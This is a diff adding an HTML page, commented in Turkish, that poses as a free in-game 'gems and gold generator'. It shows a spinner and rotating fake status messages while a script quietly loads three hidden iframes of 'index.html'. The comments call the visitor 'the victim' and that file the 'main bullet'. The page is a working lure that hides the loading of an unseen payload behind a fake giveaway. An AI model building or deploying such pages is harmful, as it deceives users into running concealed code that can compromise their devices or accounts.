@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Free Gems & Gold Generator</title>
+    <style>
+        body { 
+            background: #111; 
+            color: #f1c40f; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            text-align: center; 
+            padding-top: 15%; 
+            margin: 0;
+        }
+        .loader { 
+            border: 8px solid #333; 
+            border-top: 8px solid #f1c40f; 
+            border-radius: 50%; 
+            width: 60px; 
+            height: 60px; 
+            animation: spin 1s linear infinite; 
+            margin: 20px auto; 
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-text { color: #888; font-size: 14px; margin-top: 10px; font-style: italic; }
+        h1 { letter-spacing: 2px; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h1>ELMASLAR AKTARILIYOR</h1>
+    <p>Bağlantı güvenli, lütfen bekleyin...</p>
+    <div class="status-text" id="status">Sunucu ile eşleşiliyor...</div>
+
+    <script>
+        // Kurbanın ekrana bakıp "aa yükleniyor" demesi için ufak bir oyalama
+        const messages = [
+            "Kullanıcı verileri taranıyor...",
+            "API bağlantısı kuruluyor...",
+            "Paketler şifreleniyor...",
+            "RAM optimizasyonu yapılıyor..."
+        ];
+        let step = 0;
+        setInterval(() => {
+            if(step < messages.length) {
+                document.getElementById('status').innerText = messages[step++];
+            }
+        }, 2500);
+
+        // İŞTE KRİTİK NOKTA: 3 adet "index.html" (ana mermi) arka planda ateşleniyor
+        for (let i = 0; i < 3; i++) {
+            let mermi = document.createElement("iframe");
+            mermi.src = "index.html"; // Merminin adı index.html olduğu için buraya yazdık
+            mermi.style.display = "none"; // Kurban mermileri görmez
+            document.body.appendChild(mermi);
+        }
+    </script>
+</body>
+</html>
